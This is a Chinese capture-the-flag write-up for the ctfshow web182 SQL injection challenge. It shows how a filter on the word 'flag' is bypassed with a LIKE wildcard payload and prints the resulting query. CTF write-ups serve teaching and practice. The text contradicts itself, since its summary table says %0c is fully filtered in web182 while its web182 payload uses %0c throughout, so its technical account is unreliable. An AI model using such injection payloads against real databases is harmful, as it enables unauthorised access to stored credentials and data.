### 🧪 注入过程

#### 第1步：分析新限制

web182在web181的基础上**新增了`flag`关键字过滤**。这意味着不能直接在payload中写 `username='flag'`。

#### 第2步：寻找替代方案

可以使用 `like` 模糊查询配合通配符来绕过：

- `like '%fla%'` 可以匹配到 "flag"
- `%` 是通配符，代表任意字符

#### 第3步：构造payload

```bash
999'%0cor%0cusername%0clike'%fla%
```

**SQL执行后：**

```sql
select id,username,password from ctfshow_user 
where username !='flag' and id = '999' or username like '%fla%' limit 1;
```

由于 `username like '%fla%'` 匹配到 "flag" 用户，成功绕过过滤。

### 💡 知识点总结

| 知识点            | 说明                                                         |
| :---------------- | :----------------------------------------------------------- |
| **like模糊查询**  | 当直接匹配字符串被过滤时，可以用 `like` 配合通配符 `%` 绕过  |
| **通配符`%`**     | 代表任意字符（包括空字符），`'%fla%'` 可以匹配包含"fla"的任何字符串 |
| **逐级加强的WAF** | 每道题都在上一题基础上增加过滤规则，需要不断调整思路         |
| **%0c的失效**     | web181中可用的`%0c`在web182中被彻底过滤                      |
